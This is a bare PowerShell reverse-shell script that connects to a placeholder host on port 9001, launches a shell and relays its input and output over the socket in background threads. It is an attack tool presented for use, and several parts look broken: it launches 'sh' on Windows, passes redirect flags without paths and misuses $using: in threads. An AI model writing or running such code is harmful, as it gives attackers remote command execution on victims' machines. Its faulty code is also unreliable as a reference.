# windows
Add-Type -AssemblyName System.Threading

function s2p {
    param($s, $p)
    while ($true) {
        $buffer = New-Object byte[] 1024
        $count = $s.Receive($buffer, 0, 1024, [System.Net.Sockets.SocketFlags]::None)
        if ($count -gt 0) {
            $p.StandardInput.BaseStream.Write($buffer, 0, $count)
            $p.StandardInput.BaseStream.Flush()
        }
    }
}

function p2s {
    param($s, $p)
    while ($true) {
        $b = New-Object byte[] 1
        $read = $p.StandardOutput.BaseStream.Read($b, 0, 1)
        if ($read -gt 0) {
            $s.Send($b, 0, $read, [System.Net.Sockets.SocketFlags]::None) | Out-Null
        }
    }
}

$s = New-Object System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork,
                                         [System.Net.Sockets.SocketType]::Stream,
                                         [System.Net.Sockets.ProtocolType]::Tcp)
$s.Connect("IP_ADDRESS", 9001)

$p = Start-Process -FilePath "sh" -NoNewWindow -RedirectStandardInput -RedirectStandardOutput -RedirectStandardError -PassThru

$s2p_thread = [System.Threading.Thread]::new({ s2p $using:s $using:p })
$s2p_thread.IsBackground = $true
$s2p_thread.Start()

$p2s_thread = [System.Threading.Thread]::new({ p2s $using:s $using:p })
$p2s_thread.IsBackground = $true
$p2s_thread.Start()

try {
    $p.WaitForExit()
}
catch {
    $s.Close()
}